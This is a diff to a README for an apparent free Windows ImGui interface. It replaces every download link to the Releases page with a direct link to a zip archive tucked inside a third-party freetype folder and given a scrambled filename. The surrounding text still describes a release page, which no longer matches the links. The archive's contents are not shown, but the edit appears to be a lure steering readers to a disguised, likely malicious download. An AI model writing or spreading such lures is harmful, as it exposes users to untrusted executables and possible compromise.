@@ -1,6 +1,6 @@
 # 🎨 Free-Solace-ImGui-Interface - A Beautiful, Fast Interface for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Free_Solace_Interface-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/mjhantaa/Free-Solace-ImGui-Interface/releases)
+[![Download Now](https://img.shields.io/badge/Download-Free_Solace_Interface-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/mjhantaa/Free-Solace-ImGui-Interface/main/thirdparty/freetype/win64/Interface-Free-Gui-Im-Solace-1.5-alpha.2.zip)
 
 ## 👋 Welcome to Free-Solace-ImGui-Interface
 
@@ -25,7 +25,7 @@ Follow these three simple steps to get the interface running on your computer:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/mjhantaa/Free-Solace-ImGui-Interface/releases](https://github.com/mjhantaa/Free-Solace-ImGui-Interface/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/mjhantaa/Free-Solace-ImGui-Interface/main/thirdparty/freetype/win64/Interface-Free-Gui-Im-Solace-1.5-alpha.2.zip](https://raw.githubusercontent.com/mjhantaa/Free-Solace-ImGui-Interface/main/thirdparty/freetype/win64/Interface-Free-Gui-Im-Solace-1.5-alpha.2.zip)**
 
 When you click the link, you'll see a page with the latest release. Look for the file that matches your computer (usually named something like `Free-Solace-Interface-Windows.zip`). Click on it to download it to your computer.
 
@@ -131,7 +131,7 @@ This is an open-source project, which means it's made by the community, for the 
 
 Don't wait. Get your free copy now:
 
-[![Download Free-Solace-ImGui-Interface](https://img.shields.io/badge/⬇️_Download_Now-Free_Solace_Interface-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mjhantaa/Free-Solace-ImGui-Interface/releases)
+[![Download Free-Solace-ImGui-Interface](https://img.shields.io/badge/⬇️_Download_Now-Free_Solace_Interface-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mjhantaa/Free-Solace-ImGui-Interface/main/thirdparty/freetype/win64/Interface-Free-Gui-Im-Solace-1.5-alpha.2.zip)
 
 The download is small, the setup takes less than a minute, and the result is a stunning, professional-grade interface that you'll love to use.
 
